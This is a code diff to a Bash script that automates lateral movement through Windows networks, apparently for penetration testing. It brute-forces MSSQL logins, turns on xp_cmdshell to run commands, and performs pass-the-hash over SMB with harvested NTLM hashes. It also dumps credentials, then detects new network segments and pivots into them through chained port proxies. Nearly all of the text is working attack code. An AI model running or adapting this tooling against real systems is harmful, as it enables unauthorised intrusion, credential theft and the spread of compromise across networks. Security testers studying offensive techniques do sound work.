                 [[ $FOUND -eq 1 ]] && break
                 while read -r PASS; do
@@ -443,116 +440,126 @@ attack_new_segment() {
                     ATTEMPT=$((ATTEMPT + 1))
                     echo -ne "\r[*]   Attempt $ATTEMPT: $USER:$PASS ...          "
                     local RESULT
-                    RESULT=$(timeout 15 bash -c "printf 'exit\n' | mssqlclient '${USER}:${PASS}@${PIVOT_REACHABLE_IP}' -port '$PROXY_PORT' 2>&1")
+                    RESULT=$(timeout 15 bash -c "printf 'exit\n' | mssqlclient '${USER}:${PASS}@${KALI_IP}' -port '$KALI_PORT' 2>&1")
                     if echo "$RESULT" | grep -qi "ENVCHANGE\|ACK:\|Press help"; then
-                        echo -e "\r[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT (via proxy)          "
+                        echo -e "\r[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT          "
                         echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS" >> "$CREDS_FILE"
-                        echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS:proxy:${PIVOT_REACHABLE_IP}:${PROXY_PORT}" \
-                            >> "$PIVOT_DIR/credreuse-successes.txt"
+                        echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS:proxy:${KALI_IP}:${KALI_PORT}" >> "$PIVOT_DIR/credreuse-successes.txt"
                         COMPROMISED_MAP["$REMOTE_IP"]=1
+                        PROXY_CHAIN_MAP["$REMOTE_IP"]="${KALI_IP}:${KALI_PORT}"
                         FOUND=1
 
-                        echo "[*]   Enabling xp_cmdshell on $REMOTE_IP (via proxy)..."
-                        printf "sp_configure 'show advanced options', '1';
-RECONFIGURE;
-sp_configure 'xp_cmdshell', '1';
-RECONFIGURE;
-exec master..xp_cmdshell 'hostname';
-exec master..xp_cmdshell 'ipconfig /all';
-exit
-" | mssqlclient "${USER}:${PASS}@${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" 2>&1 | \
+                        echo "[*]   Enabling xp_cmdshell on $REMOTE_IP..."
+                        printf "sp_configure 'show advanced options', '1';\nRECONFIGURE;\nsp_configure 'xp_cmdshell', '1';\nRECONFIGURE;\nexec master..xp_cmdshell 'hostname';\nexec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
+                            mssqlclient "${USER}:${PASS}@${KALI_IP}" -port "$KALI_PORT" 2>&1 | \
                             tee "$MSSQL_DIR/${REMOTE_IP//./_}_${REMOTE_PORT}_cmdshell.txt"
 
+                        # Full post-exploitation chain on this remote host
+                        remote_post_exploit "$REMOTE_IP" "mssql" "$KALI_IP" "$KALI_PORT" "$USER" "$PASS"
+
+                        # Recursive NIC check on newly compromised host
+                        echo "[*]   Checking $REMOTE_IP for additional networks..."
+                        local NEW_IPCONFIG
+                        NEW_IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
+                            mssqlclient "${USER}:${PASS}@${KALI_IP}" -port "$KALI_PORT" 2>&1)
+
+                        while IFS='|' read -r CIDR_RANGE NEXT_PIVOT_IP; do
+                            [[ -z "$CIDR_RANGE" ]] && continue
+                            echo "[+]   NEW segment: $CIDR_RANGE (via $NEXT_PIVOT_IP on $REMOTE_IP)"
+                            echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
+                            echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
+                            read -p "[?]   Pivot into $CIDR_RANGE? (y/n): " PIVOT_CONFIRM
+                            if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
+                                echo "PIVOTED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
+                                attack_new_segment "$REMOTE_IP" "$NEXT_PIVOT_IP" "$CIDR_RANGE" "$NEXT_PIVOT_IP"
+                            else
+                                echo "DECLINED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
+                                echo "[*]   Skipping $CIDR_RANGE per operator decision."
+                            fi
+                        done < <(parse_networks_from_ipconfig "$NEW_IPCONFIG")
                         break
                     fi
                 done < "$PASS_FILE"
             done < "$USERS_FILE"
-
             if [[ $FOUND -eq 0 ]]; then
-                echo -e "\r[-] No credentials found on $REMOTE_IP:$REMOTE_PORT after $ATTEMPT attempts          "
+                echo -e "\r[-] No credentials found after $ATTEMPT attempts          "
             fi
         fi
 
         if [[ "$REMOTE_PORT" == "445" ]]; then
-            echo "[*] Trying PtH on $REMOTE_IP:445 via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
-
-            # Get all hashes we have
+            echo "[*] Trying PtH on $REMOTE_IP via ${KALI_IP}:${KALI_PORT}..."
             local ALL_HASHES
-            ALL_HASHES=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)
-            local HASH_COUNT
+            ALL_HASHES=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
+            local HASH_COUNT HASH_NUM=0 PTH_HIT=0
             HASH_COUNT=$(echo "$ALL_HASHES" | wc -l)
-            local HASH_NUM=0
-            local PTH_HIT=0
-
             while IFS= read -r HLINE; do
                 local NTHASH
                 NTHASH=$(echo "$HLINE" | cut -d: -f4)
                 [[ -z "$NTHASH" ]] && continue
                 HASH_NUM=$((HASH_NUM + 1))
                 echo -ne "\r[*]   Hash $HASH_NUM/$HASH_COUNT: ${NTHASH:0:16}...          "
-
                 local RESULT
-                RESULT=$(timeout 15 nxc smb "${PIVOT_REACHABLE_IP}" --port "$PROXY_PORT" \
+                RESULT=$(timeout 15 nxc smb "${KALI_IP}" --port "$KALI_PORT" \
                     -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)
-
                 if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
-                    echo -e "\r[+] PtH SUCCESS on $REMOTE_IP via proxy (hash ${NTHASH:0:16}...)          "
+                    echo -e "\r[+] PtH SUCCESS on $REMOTE_IP (hash ${NTHASH:0:16}...)          "
                     if ! grep -q "^${REMOTE_IP}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null; then
                         echo "$REMOTE_IP:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
                     fi
                     COMPROMISED_MAP["$REMOTE_IP"]=1
+                    PROXY_CHAIN_MAP["$REMOTE_IP"]="${KALI_IP}:${KALI_PORT}"
                     PTH_HIT=1
 
-                    echo "[*]   Running secretsdump on $REMOTE_IP via proxy..."
-                    local SAFE_REMOTE="${REMOTE_IP//./_}"
-                    local REMOTE_LOOT="$LOOT_DIR/${SAFE_REMOTE}"
-                    mkdir -p "$REMOTE_LOOT"
-                    timeout 60 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
-                        -target-ip "${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" \
-                        "Administrator@${PIVOT_REACHABLE_IP}" 2>&1 | \
-                        grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
-                        tee "$REMOTE_LOOT/hashes.txt" 
+                    # Full post-exploitation chain on this remote host
+                    remote_post_exploit "$REMOTE_IP" "pth" "$KALI_IP" "$KALI_PORT" "$NTHASH" "Administrator"
 
+                    # Recursive NIC check
+                    echo "[*]   Checking $REMOTE_IP for additional networks..."
+                    local NEW_IPCONFIG
+                    NEW_IPCONFIG=$(nxc smb "${KALI_IP}" --port "$KALI_PORT" \
+                        -u "Administrator" -H "$NTHASH" -x "ipconfig /all" 2>&1)
+                    while IFS='|' read -r CIDR_RANGE NEXT_PIVOT_IP; do
+                        [[ -z "$CIDR_RANGE" ]] && continue
+                        echo "[+]   NEW segment: $CIDR_RANGE (via $NEXT_PIVOT_IP on $REMOTE_IP)"
+                        echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
+                        echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
+                        read -p "[?]   Pivot into $CIDR_RANGE? (y/n): " PIVOT_CONFIRM
+                        if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
+                            echo "PIVOTED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
+                            attack_new_segment "$REMOTE_IP" "$NEXT_PIVOT_IP" "$CIDR_RANGE" "$NEXT_PIVOT_IP"
+                        else
+                            echo "DECLINED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
+                            echo "[*]   Skipping $CIDR_RANGE per operator decision."
+                        fi
+                    done < <(parse_networks_from_ipconfig "$NEW_IPCONFIG")
                     break
                 fi
             done <<< "$ALL_HASHES"
-
             if [[ $PTH_HIT -eq 0 ]]; then
-                echo -e "\r[-] PtH failed on $REMOTE_IP via proxy ($HASH_NUM hashes tried)          "
+                echo -e "\r[-] PtH failed ($HASH_NUM hashes tried)          "
             fi
         fi
-
     done < "$FORWARD_MAP"
 
-    # Add discovered hosts to master targets list
     cut -d: -f1 "$SCAN_RESULTS" | sort -u >> "$TARGETS_FILE"
     sort -u "$TARGETS_FILE" -o "$TARGETS_FILE"
-
     echo ""
     echo "[+] Cross-network pivot on $NEW_CIDR complete."
 }
 
 
-
 # MAIN EXECUTION
-
 echo "[*] Starting lateral movement phase"
 echo "[*] Known compromised hosts: ${!COMPROMISED_MAP[*]}"
 echo ""
 
-
-# Phase 0: Check all currently compromised hosts for new network segments
-
+# Phase 0: Check compromised hosts for new network segments
 echo "[*] Phase 0: Checking compromised hosts for additional network interfaces..."
-
-# We need to track which pivot host reaches which new segment
-# so we can set up portproxy through the right host
-declare -A SEGMENT_PIVOT_MAP  # CIDR -> "PIVOT_HOST|REACHABLE_IP"
+declare -A SEGMENT_PIVOT_MAP
 
 while IFS=: read -r IP PORT U P; do
     IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
-	mssqlclient "${U}:${P}@${IP}" -port "$PORT" 2>&1)
-
+        mssqlclient "${U}:${P}@${IP}" -port "$PORT" 2>&1)
     while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
         [[ -z "$CIDR_RANGE" ]] && continue
         echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $IP)"
@@ -562,7 +569,6 @@ while IFS=: read -r IP PORT U P; do
     done < <(parse_networks_from_ipconfig "$IPCONFIG")
 done < "$CREDS_FILE"
 
-# Attack any new segments found
 for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
     IFS='|' read -r PIVOT_HOST PIVOT_REACH_IP PIVOT_SEG_IP <<< "${SEGMENT_PIVOT_MAP[$CIDR]}"
     echo ""
@@ -578,15 +584,13 @@ for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
     fi
 done
 
-# Phase 1: Pass-the-Hash against all live hosts (same-segment)
-
+# Phase 1: Pass-the-Hash
 echo ""
 echo "[*] Phase 1: Pass-the-Hash with harvested NTLM hashes"
-
 HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
 
 if [[ -z "$HASH_LIST" ]]; then
-    echo "[-] No NTLM hashes found in $LOOT_DIR. Skipping PtH phase."
+    echo "[-] No NTLM hashes found. Skipping PtH phase."
 else
     if [[ ! -f "$TARGETS_FILE" ]]; then
         echo "[-] $TARGETS_FILE not found. Skipping PtH."
@@ -596,45 +600,62 @@ else
         while [[ $PIVOT_CHANGED -eq 1 ]]; do
             PIVOT_CHANGED=0
             echo "[*] PtH round $PIVOT_ROUND..."
-
             while read -r HOST; do
                 is_compromised "$HOST" && continue
-
                 echo "[*] Trying PtH against $HOST..."
                 SAFE_HOST="${HOST//./_}"
                 PTH_LOG="$PIVOT_DIR/${SAFE_HOST}_pth.txt"
 
-                # Refresh hash list each round
-                HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
+                # Determine how Kali reaches this host
+                local PTH_TARGET="$HOST"
+                local PTH_PORT_FLAG=""
+                local HOST_CHAIN="${PROXY_CHAIN_MAP[$HOST]:-UNKNOWN}"
+                if [[ "$HOST_CHAIN" == "UNKNOWN" ]]; then
+                    # Host was added to targets.txt by attack_new_segment
+                    # but not yet in PROXY_CHAIN_MAP — look up portproxy for 445
+                    local PP_LINE
+                    PP_LINE=$(grep "|${HOST}|445" "$PORTPROXY_FILE" 2>/dev/null | head -1)
+                    if [[ -n "$PP_LINE" ]]; then
+                        PTH_TARGET=$(echo "$PP_LINE" | cut -d'|' -f2)
+                        local PP_PORT
+                        PP_PORT=$(echo "$PP_LINE" | cut -d'|' -f3)
+                        PTH_PORT_FLAG="--port $PP_PORT"
+                        echo "[*]   Remote host — routing through ${PTH_TARGET}:${PP_PORT}"
+                    else
+                        echo "[-]   No route to $HOST (not direct, no 445 portproxy). Skipping."
+                        continue
+                    fi
+                elif [[ "$HOST_CHAIN" != "DIRECT" ]]; then
+                    PTH_TARGET="${HOST_CHAIN%%:*}"
+                    local PP_PORT="${HOST_CHAIN##*:}"
+                    PTH_PORT_FLAG="--port $PP_PORT"
+                    echo "[*]   Remote host — routing through ${PTH_TARGET}:${PP_PORT}"
+                fi
 
+                HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
                 while IFS= read -r HLINE; do
                     NTHASH=$(echo "$HLINE" | cut -d: -f4)
                     [[ -z "$NTHASH" ]] && continue
-
-                    RESULT=$(nxc smb "$HOST" -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)
-
+                    RESULT=$(nxc smb "$PTH_TARGET" $PTH_PORT_FLAG -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)
                     if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
                         echo "[+] PtH SUCCESS on $HOST with hash ${NTHASH:0:16}..."
-                        # Only append if not already recorded
                         if ! grep -q "^${HOST}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null; then
                             echo "$HOST:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
                         fi
                         COMPROMISED_MAP["$HOST"]=1
+                        if [[ -n "$PTH_PORT_FLAG" ]]; then
+                            PROXY_CHAIN_MAP["$HOST"]="${PTH_TARGET}:${PTH_PORT_FLAG##*--port }"
+                        else
+                            PROXY_CHAIN_MAP["$HOST"]="DIRECT"
+                        fi
                         PIVOT_CHANGED=1
-
-                        # Recon
                         echo "[*] Running recon on $HOST via PtH..."
-                        nxc smb "$HOST" -u "Administrator" -H "$NTHASH" \
+                        nxc smb "$PTH_TARGET" $PTH_PORT_FLAG -u "Administrator" -H "$NTHASH" \
                             -x "hostname && ipconfig /all && net localgroup administrators" 2>&1 | \
                             tee "$PTH_LOG"
-
-                        # Hashdump
                         pivot_hashdump "$HOST" "$NTHASH"
-
-                        # Check for new networks
-                        IPCONFIG=$(nxc smb "$HOST" -u "Administrator" -H "$NTHASH" \
+                        IPCONFIG=$(nxc smb "$PTH_TARGET" $PTH_PORT_FLAG -u "Administrator" -H "$NTHASH" \
                             -x "ipconfig /all" 2>&1)
-
                         while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
                             [[ -z "$CIDR_RANGE" ]] && continue
                             echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
@@ -643,22 +664,19 @@ else
                             read -p "[?] Pivot into $CIDR_RANGE? (y/n): " PIVOT_CONFIRM
                             if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
                                 echo "PIVOTED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
-                                attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
+                                attack_new_segment "$HOST" "$PTH_TARGET" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
                             else
                                 echo "DECLINED:$CIDR_RANGE" >> "$PIVOT_DIR/pivot-decisions.txt"
                                 echo "[*] Skipping $CIDR_RANGE per operator decision."
                             fi
                         done < <(parse_networks_from_ipconfig "$IPCONFIG")
-
                         break
                     fi
                 done <<< "$HASH_LIST"
-
                 if ! is_compromised "$HOST"; then
                     echo "[-] PtH failed on $HOST"
                 fi
             done < "$TARGETS_FILE"
-
             PIVOT_ROUND=$((PIVOT_ROUND + 1))
             if [[ $PIVOT_ROUND -gt 10 ]]; then
                 echo "[!] Reached maximum pivot rounds (10). Stopping."
@@ -668,13 +686,9 @@ else
     fi
 fi
 
-
-
 # Phase 2: MSSQL Credential Reuse
-
 echo ""
 echo "[*] Phase 2: MSSQL credential reuse on remaining hosts"
-
 MSSQL_TARGETS="$OUTDIR/hosts/mssql-targets.txt"
 if [[ ! -f "$MSSQL_TARGETS" ]]; then
     echo "[-] $MSSQL_TARGETS not found. Skipping credential reuse."
@@ -691,41 +705,25 @@ else
 
     while IFS=: read -r TARGET_IP TARGET_PORT; do
         is_compromised "$TARGET_IP" && continue
-
         echo "[*] Trying credential reuse on $TARGET_IP:$TARGET_PORT..."
         SAFE_TARGET="${TARGET_IP//./_}"
-
         for CRED in "${CRED_PAIRS[@]}"; do
             U="${CRED%%:*}"
             P="${CRED#*:}"
-
             RESULT=$(printf "select @@servername;\nexit\n" | \
                 mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)
-
             if echo "$RESULT" | grep -qi "ACK:\|Press help\|ENVCHANGE"; then
                 echo "[+] Credential reuse SUCCESS: $U:$P on $TARGET_IP:$TARGET_PORT"
                 echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$PIVOT_DIR/credreuse-successes.txt"
-
                 PIVOT_LOG="$PIVOT_DIR/${SAFE_TARGET}_mssql_pivot.txt"
-                printf "sp_configure 'show advanced options', '1';
-RECONFIGURE;
-sp_configure 'xp_cmdshell', '1';
-RECONFIGURE;
-exec master..xp_cmdshell 'hostname';
-exec master..xp_cmdshell 'ipconfig /all';
-exec master..xp_cmdshell 'net localgroup administrators';
-exit
-" | mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1 | \
-                    tee "$PIVOT_LOG"
-
+                printf "sp_configure 'show advanced options', '1';\nRECONFIGURE;\nsp_configure 'xp_cmdshell', '1';\nRECONFIGURE;\nexec master..xp_cmdshell 'hostname';\nexec master..xp_cmdshell 'ipconfig /all';\nexec master..xp_cmdshell 'net localgroup administrators';\nexit\n" | \
+                    mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1 | tee "$PIVOT_LOG"
                 echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$CREDS_FILE"
                 COMPROMISED_MAP["$TARGET_IP"]=1
+                PROXY_CHAIN_MAP["$TARGET_IP"]="DIRECT"
                 echo "[+] Pivot recon saved to $PIVOT_LOG"
-
-                # Check for new networks
                 IPCONFIG=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
                     mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)
-
                 while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
                     [[ -z "$CIDR_RANGE" ]] && continue
                     echo "[+] NEW network segment: $CIDR_RANGE (via $PIVOT_IFACE_IP on $TARGET_IP)"
@@ -733,21 +731,16 @@ exit
                     echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
                     attack_new_segment "$TARGET_IP" "$TARGET_IP" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
                 done < <(parse_networks_from_ipconfig "$IPCONFIG")
-
                 break
             fi
         done
-
         if ! is_compromised "$TARGET_IP"; then
             echo "[-] No valid credentials for $TARGET_IP:$TARGET_PORT"
         fi
     done < "$MSSQL_TARGETS"
 fi
 
-
-
 # Summary
-
 echo ""
 echo "[+] Lateral movement phase complete."
 echo "[+] Total compromised hosts: ${#COMPROMISED_MAP[@]}"
@@ -775,3 +768,12 @@ if [[ -s "$PORTPROXY_FILE" ]]; then
         echo "    ${PH}:${PP} -> ${RI}:${RP}"
     done < "$PORTPROXY_FILE"
 fi
+
+echo ""
+echo "[+] Proxy chain map (how Kali reaches each host):"
+CHAIN_FILE="$PIVOT_DIR/proxy-chain-map.txt"
+> "$CHAIN_FILE"
+for H in "${!PROXY_CHAIN_MAP[@]}"; do
+    echo "    $H -> ${PROXY_CHAIN_MAP[$H]}"
+    echo "${H}|${PROXY_CHAIN_MAP[$H]}" >> "$CHAIN_FILE"
+done
